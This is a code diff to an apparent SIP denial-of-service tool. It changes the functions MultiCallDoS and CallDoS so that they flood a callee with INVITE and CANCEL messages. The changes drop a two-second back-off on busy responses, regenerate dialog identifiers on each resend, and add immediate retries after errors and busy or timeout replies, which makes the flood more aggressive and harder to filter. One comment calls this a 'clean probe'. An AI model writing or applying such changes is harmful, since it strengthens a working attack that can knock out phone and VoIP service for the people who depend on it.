@@ -586,15 +586,20 @@ void Application::MultiCallDoS(pollfd& pfd, int nReady, const std::vector<std::s
           }
           break;
         case SipState::BUSY:
-          std::this_thread::sleep_for(std::chrono::milliseconds(2000));
+          // Immediate retry on timeout/busy
           if (util::context.verbose > 1) std::cout << "SEND CANCEL" << std::endl;
           session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(front->cancel.data()), front->cancel.size()));
+
+          // Regenerate dialog IDs for a clean probe
+          back->setBranch();
+          back->setCallId();
+          back->setFromTag();
 
           if (util::context.verbose > 1) std::cout << "SEND INVITE" << std::endl;
           session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(back->invite.data()), back->invite.size()));
           session.currentSipState = SipState::INVITE;
 
-          // Create new sip call session
+          // Prepare next rotation of front/back
           front->setBranch();
           front->setCallId();
           front->setFromTag();
@@ -714,11 +719,22 @@ void Application::CallDoS(pollfd& pfd, int nReady, const std::string& calleeId) 
   std::thread inviteThread;
   bool expobackoff;
   while (true) {
-    if (!handleIncomingPackets(nReady)) break;
+    if (!handleIncomingPackets(nReady)) {
+      // force immediate retry if we got a transport error
+      session.state.retryImmediate = true;
+    }
     if (nReady == 0 && session.currentSipState == SipState::END) break;
 
 
     if (nReady >= 0) {
+      // If a retry was requested (e.g., 486/500/408), fire a fresh INVITE immediately
+      if (session.state.retryImmediate) {
+        session.state.retryImmediate = false;
+        back.setBranch(); back.setCallId(); back.setFromTag();
+        if (util::context.verbose > 1) std::cout << "RETRY INVITE (immediate)" << std::endl;
+        session.encapsulate(std::span<uint8_t>(reinterpret_cast<uint8_t*>(back.invite.data()), back.invite.size()));
+        session.currentSipState = SipState::INVITE;
+      }
       // Send SIP INVITE and CANCEL
       switch (session.currentSipState) {
         case SipState::SPROG: // Wait for DoS, refer to RFC3261 section 7.1.1
